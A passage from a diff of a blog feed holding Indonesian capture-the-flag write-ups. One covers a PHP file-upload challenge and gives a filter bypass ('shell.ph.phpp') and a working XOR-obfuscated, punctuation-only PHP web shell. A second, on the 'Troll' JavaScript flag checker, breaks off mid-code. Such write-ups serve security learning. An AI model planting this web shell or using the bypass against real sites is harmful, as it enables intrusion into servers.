+      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Isi file hanya boleh ada karakter tanda baca dan whitespace&#39;</span>);
+    }
+
+    $name <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>];
+    $name <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($name, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">50</span>);
+    $name <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^a-zA-Z0-9_\.]/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $name);
+
+    <span style="color:#75715e">// bibit unggul dilarang ngehack
+</span><span style="color:#75715e"></span>    $blacklist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;.php&#39;</span>, <span style="color:#e6db74">&#39;.php3&#39;</span>, <span style="color:#e6db74">&#39;.php4&#39;</span>, <span style="color:#e6db74">&#39;.php5&#39;</span>, <span style="color:#e6db74">&#39;.php7&#39;</span>);
+    $name <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_ireplace</span>($blacklist, <span style="color:#e6db74">&#39;&#39;</span>, $name);
+
+    $rand <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">20</span>));
+    $file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/</span><span style="color:#e6db74">$rand</span><span style="color:#e6db74">-</span><span style="color:#e6db74">$name</span><span style="color:#e6db74">&#34;</span>;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>], $file)) {
+      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Gagal upload file&#39;</span>);
+    }
+    <span style="color:#66d9ef">return</span> $file;
+  }
+
+  $file <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+  $output <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+  $error <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+
+  <span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
+    <span style="color:#75715e">// https://github.com/dotzero/brainfuck-php/blob/master/src/Brainfuck.php
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#39;brainduck.php&#39;</span>;
+    <span style="color:#66d9ef">try</span> {
+      $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">processUpload</span>();
+      $brainduck <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Brainduck</span>(<span style="color:#a6e22e">file_get_contents</span>($file), <span style="color:#e6db74">&#39;Brainduck&#39;</span>, <span style="color:#66d9ef">true</span>);
+      $output <span style="color:#f92672">=</span> $brainduck<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">run</span>(<span style="color:#66d9ef">true</span>);
+    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e) {
+      $error <span style="color:#f92672">=</span> $e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>();
+    }
+  }
+<span style="color:#75715e">?&gt;</span>
+<span style="color:#75715e">&lt;!-- /?debug=V --&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+  &lt;<span style="color:#f92672">head</span>&gt;
+    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge&#34;</span>&gt;
+    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;</span>&gt;
+
+    &lt;<span style="color:#f92672">title</span>&gt;Brainduck&lt;/<span style="color:#f92672">title</span>&gt;
+
+    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vendor/bootstrap/css/bootstrap.min.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
+  &lt;/<span style="color:#f92672">head</span>&gt;
+
+  &lt;<span style="color:#f92672">body</span>&gt;
+    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-fluid&#34;</span>&gt;
+
+<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($error)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
+      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert alert-danger&#34;</span>&gt;
+        <span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($error); <span style="color:#75715e">?&gt;</span>
+      &lt;/<span style="color:#f92672">div</span>&gt;
+<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">elseif</span>($file)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
+      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert alert-success&#34;</span>&gt;
+        File sukses terupload. &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($file); <span style="color:#75715e">?&gt;</span><span style="color:#e6db74">&#34;</span>&gt;Download&lt;/<span style="color:#f92672">a</span>&gt;
+      &lt;/<span style="color:#f92672">div</span>&gt;
+<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
+
+<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($output <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span>)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
+<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($output <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header alert alert-danger&#34;</span>&gt;
+          Tidak ada output atau terjadi error
+        &lt;/<span style="color:#f92672">div</span>&gt;
+<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
+      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card mb-3&#34;</span>&gt;
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header alert alert-success&#34;</span>&gt;
+          Output
+        &lt;/<span style="color:#f92672">div</span>&gt;
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-body&#34;</span>&gt;
+          &lt;<span style="color:#f92672">code</span>&gt;<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($output); <span style="color:#75715e">?&gt;</span>&lt;/<span style="color:#f92672">code</span>&gt;
+        &lt;/<span style="color:#f92672">div</span>&gt;
+      &lt;/<span style="color:#f92672">div</span>&gt;
+<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
+<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
+
+      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card mb-3&#34;</span>&gt;
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header&#34;</span>&gt;
+          Upload file Brainduck
+        &lt;/<span style="color:#f92672">div</span>&gt;
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-body&#34;</span>&gt;
+          Contoh:
+          &lt;<span style="color:#f92672">ul</span>&gt;
+            &lt;<span style="color:#f92672">li</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;examples/hello_world.bf&#34;</span>&gt;Hello World!&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
+            &lt;<span style="color:#f92672">li</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;examples/squares.bf&#34;</span>&gt;Bilangan Kuadrat&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
+          &lt;/<span style="color:#f92672">ul</span>&gt;
+          &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
+            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">required</span>&gt;
+            &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn btn-primary&#34;</span>&gt;Upload&lt;/<span style="color:#f92672">button</span>&gt;
+          &lt;/<span style="color:#f92672">form</span>&gt;
+        &lt;/<span style="color:#f92672">div</span>&gt;
+      &lt;/<span style="color:#f92672">div</span>&gt;
+    &lt;/<span style="color:#f92672">div</span>&gt;
+  &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>Sebenarnya tak ada hubungannya dengan brainfuck, jika kita melihat source diatas, kita dapat menyimpulkan bahwa vuln terdapat dibagian Upload File.</p>
+<p>Loh kok upload file?</p>
+<ol>
+<li>Karena bisa didownload/diakses</li>
+<li>Filter ekstensi hanya str_ireplace yang bisa diakali</li>
+<li>Tetap dapat menginputkan punctuation characters (tidak hanya + - &gt; &lt; . ,)</li>
+</ol>
+<p>Bagaimana cara mengakali str_ireplace?
+Dengan cara merubah ekstensi menjadi namafile.ph.phpp, sehingga akan menjadi namafile.php karena .php akan difilter/dihilangkan</p>
+<p>Lalu bagaimana kita memasukkan shell yang hanya punctuation character saja ?
+Dengan cara menggunakan XOR pada PHP, karena pada bahasa pemrograman PHP kita bisa melakukan String XOR.</p>
+<p>Kita akan melakukan XOR string &ldquo;<strong>`{{{</strong>&rdquo; dengan string &ldquo;<strong>?&lt;&gt;/</strong>&rdquo; yang dimana empat karakter tersebut jika diXOR akan menghasilkan _GET</p>
+<p>Lalu kita tinggal merangkainya menjadi sebuah shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span>$_<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;`{{{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;?&lt;&gt;/&#34;</span>;${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>](${$_}[<span style="color:#a6e22e">___</span>]));
+</code></pre></div><p>lalu simpan dengan nama shell.ph.phpp dan langsung saja kita upload.</p>
+<p>Akhirnya kita bisa melakukan akses shell dengan mengakses alamat berikut:</p>
+<!-- raw HTML omitted -->
+<p>(untuk melakukan listing directory, dengan catatan passthru, shell_exec, dan exec ternyata didisable)</p>
+<p>Setelah mengetahui flag terdapat pada ../flag.php maka langsung saja kita akses.</p>
+<!-- raw HTML omitted -->
+<p>Maka kita akan mendapatkan flagnya, terima kasih :)</p>
+<p><img src="/wp-content/2019/02/DxNXdIMUcAApNV0.jpg" alt=""></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Writeup Gemastik 11 - Troll</title>
+            <link>/writeup-gemastik-11-troll/</link>
+            <pubDate>Thu, 04 Oct 2018 07:12:19 +0000</pubDate>
+            
+            <guid>/writeup-gemastik-11-troll/</guid>
+            <description>Terdapat sebuah service yang memiliki source code berikut:
+&amp;lt;html&amp;gt; &amp;lt;head&amp;gt;&amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;f&amp;#34; id=&amp;#34;f&amp;#34; &amp;gt;&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Check&amp;#34; onclick=&amp;#34;ck()&amp;#34;&amp;gt; &amp;lt;script&amp;gt; ll = &amp;#34;length&amp;#34;; ca = &amp;#34;charCodeAt&amp;#34; function k(c) { return (c==&amp;#39;O&amp;#39;||c==&amp;#39;0&amp;#39;); } function n(){ for (; !k(a[i])&amp;amp;&amp;amp; i&amp;lt;a[ll]; i++); } function ck(){ a = troll.innerHTML; bb = {} for(i =0; i &amp;lt; 127; i++) { s = &amp;#34;&amp;#34;; for (j = 6; j &amp;gt;=0 ; j--) { s += (i &amp;amp; (1&amp;lt;&amp;lt;j))?</description>
+            <content type="html"><![CDATA[<p>Terdapat sebuah service yang memiliki source code berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">head</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;
+    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;f&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;f&#34;</span> &gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Check&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ck()&#34;</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#a6e22e">ll</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;length&#34;</span>;
+<span style="color:#a6e22e">ca</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;charCodeAt&#34;</span>
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">k</span>(<span style="color:#a6e22e">c</span>) {
+  <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">c</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;O&#39;</span><span style="color:#f92672">||</span><span style="color:#a6e22e">c</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;0&#39;</span>);
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">n</span>(){
+  <span style="color:#66d9ef">for</span> (; <span style="color:#f92672">!</span><span style="color:#a6e22e">k</span>(<span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">i</span>])<span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">ll</span>]; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>);
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ck</span>(){
+    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">troll</span>.<span style="color:#a6e22e">innerHTML</span>;
+    <span style="color:#a6e22e">bb</span> <span style="color:#f92672">=</span> {}
+    <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+        <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">j</span><span style="color:#f92672">--</span>) {
+            <span style="color:#a6e22e">s</span> <span style="color:#f92672">+=</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#a6e22e">j</span>))<span style="color:#f92672">?</span><span style="color:#e6db74">&#34;O&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;0&#34;</span>;				
+        }
+        <span style="color:#a6e22e">bb</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>;
+    }
+    <span style="color:#a6e22e">ff</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#a6e22e">cc</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#a6e22e">n</span>();
+
+    <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">value</span>[<span style="color:#a6e22e">ll</span>]; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bb</span>[<span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">value</span>[<span style="color:#a6e22e">ca</span>](<span style="color:#a6e22e">j</span>)]
+        <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">w</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">w</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">7</span>; <span style="color:#a6e22e">w</span><span style="color:#f92672">++</span>) {
+            <span style="color:#a6e22e">cc</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">c</span>[<span style="color:#a6e22e">ca</span>](<span style="color:#a6e22e">w</span>)<span style="color:#f92672">^</span><span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">ca</span>](<span style="color:#a6e22e">i</span>);
+            <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>;
+            <span style="color:#a6e22e">n</span>();
+        }
+    }
+    <span style="color:#a6e22e">n</span>();
+
+    <span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;Incorrect flag&#34;</span>, <span style="color:#e6db74">&#34;Correct flag&#34;</span>];
+    <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">msg</span>[<span style="color:#ae81ff">0</span><span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>(<span style="color:#a6e22e">k</span>(<span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">i</span>])) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">cc</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>))]);
+}
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;<span style="color:#f92672">pre</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;troll&#34;</span>&gt;
+QQOQ0QQQQQQQQ00QOQOOQQQQQO0QQ00OQ0QQQQQQQQOQQQQOQQQQ0QQQQ0QQQQQQQQQQQOQQQQO
+QQQ0OQQOQQQQQQQ0QQQQQQQ0QQQQQQQQQQQQ0QQ0Q0QQQOQQQQQQQQQO0QQQO0Q0QQOQQQQOQQQ
+QQO0QQO0QOQQQ0QQQQQQQ0QOQQQQQ0QQQ0QQQQO0QQ0QQQQQQQQQQQOO0QQQ0QQQQQQQQQQQOQQ
+0QOOQQQOOQQQQQQQOQQWOQ0OOWWWBBBHHHHHHHHHBWWWQOQ0QOQQQQ0QQQQ0OQQQQQQQQQO0QQQ
+OQQQOQQQQ0QQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~&#34;&#34;??9VWQQQ00QQ0OOQQQQQQ0Q0
+QQQQ00QOQOOQ0P&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&#34;?9$QQQQOQQQQQQQQQ
+QOQ0Q0QQQO0W! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQOQQOQQQOQ
+OQQQQQQOQQW&#39; jOQ00WTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HO0QQQ0w,-40QQQQQOQQ
+QQQ0QQQO0Q[ jO0QQQyWVw2$wWWQQ0WWQWWWW7WQQQO00QQPWWQOQWQQw7WO0QWWc)WWQQQQOQO
+QQQQQQQQQf jQ0QQQWWmWmm0WU???????9WWQmWQQQQQOQWjWQQOQQQQWQmQQQ0WL 4QQ0QQQOQ
+Q0QQOQQP&#39;.yOOQQQQOQOOQP&#34;       xwa,.!4WQQQQQ0QWdWP??!&#34;??4WWQ0QWQQc ?0WQQQQQ
+QQQQ0P&#39;_a._aamQQQW!_yF &#34;!` ..  &#34;??$Qa &#34;WQOQWTVP&#39;    &#34;??&#39; =QQmWWV?46/ ?QQQQ0
+QQOP&#39;sdyWQP?!`.-&#34;?46mOQ0O0QT!m0Ogaa. ;wWQQWQaa _aawmWWQQOOQ0QQQWP4a7g -WWO0
+QQ[ j@mQP&#39;adQQP4ga, -????&#34; +jQQQOQWQQQQQQQQQWW;)WOWWWW9QQP?&#34;`  -?QzO7L ]O0O
+QW j0k0@ jWQOD&#39;-?$QOQ00QQOOQQQQOQQQWWQWQQQWQQQc &#34;4QQQ0a   .QP4QQQQfWkl jQQQ
+OE ]0kOk $D?`  waa &#34;?9WWOOQP??T?47`_aamQQQQQOWWQw,-?OWWQQQOQ`&#34;QQQD\Qf(.QWQQ
+OQ,-Qm4Q/-0mQ6 &#34;WWQma/  &#34;??OQQQQQL 4W&#34;- -?$QOOQWP`s,awT$QQQ@  &#34;QW@?$:.yQ0QQ
+QQm/-4wTQgQWOO,  ?4WWk 4waac -???$wa0QQQQQQQF??&#39;imWWWWWQW?^  ` ]60Q&#39; yQQOQQ
+OQOQw,-?QmWQOOQw  a,    ?QWWQ00w _.  &#34;????9VWaamQWV???&#34;  a j/  ]QQf jQQOQ0O
+QQQQQQw,&#34;4QQQOQ0m,-$Qa     ???4F jQOQQ0wc ,aaas _aaaaa 4OW ]E  )WQ`=Q0QQQQQ
+0QQOQOWQ/ $QQO0QQ0a ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WO ]QQQQQQQ
+QQQQQ0QQQc-QWQQ0QQW6,  QWOWQQOk ,c                             jWQ ]QQQQQQ0
+QQQ00QQQQQ,&#34;$WQQWQQQ0g,.&#34;?OQQQ&#39;.mQ0Qmaa,.,                . .; QWQ.]Q0OQOQ0
+QQ0OQQQ0QWQa ?$WQ0WQQQQQa,.&#34;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQOQ(:QQQQOQQ
+QQQQ0QQQQ0WWma &#34;9gw?9gdB?QQwa, -??T$WOQ;:QQOWQ ]WWD _Qf +?! _jQQQWf QQOOQQO
+0QQQQOQQQQQQQQQws &#34;Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
+QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
+QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}mwBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
+QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&#34;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
+QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
+QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
+QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&#34;!???????!^`_saQWWQQQQQQQ
+QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
+QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
+&lt;/<span style="color:#f92672">pre</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+</code></pre></div><p>Soal yang sangat ngetroll &gt;:(</p>
+<p>Tidak perlu memperdulikan gambar trollnya walaupun memang dari SC nya sendiri ngecek dari gambar trollnya. Pada awalnya saya sangat kesal karena tertipu oleh muka troll yang menyebalkan, sehingga saya melamun sambil menangid bingung.</p>
+<p><img src="/wp-content/2018/10/nangid.png" alt=""></p>
+<p>Oh sial, saya kena troll &gt;:(</p>
+<p>Ternyata saya sadar, ternyata sangat simpel. Kode tersebut akan melakukan pengecekan setiap string dari S[i=0] sampai S[i=n] dan apabila string tersebut salah maka nilai dari variabel <strong>cc</strong> pada index i itu bukan 0. Okay langsung saja kita lakukan **bruteforce **dengan memanfaatkan kodingan yang ada untuk mendapatkan flagnya.</p>
+<p>Modifikasi fungsi ck() seperti ini dan lakukan override function/method pada menu console saat melakukan inspect element:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ck</span>(){
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">troll</span>.<span style="color:#a6e22e">innerHTML</span>;
+    <span style="color:#a6e22e">bb</span> <span style="color:#f92672">=</span> {}
+    <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+        <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">j</span><span style="color:#f92672">--</span>) {
+            <span style="color:#a6e22e">s</span> <span style="color:#f92672">+=</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#a6e22e">j</span>))<span style="color:#f92672">?</span><span style="color:#e6db74">&#34;O&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;0&#34;</span>;				
+        }
+        <span style="color:#a6e22e">bb</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>;
+    }
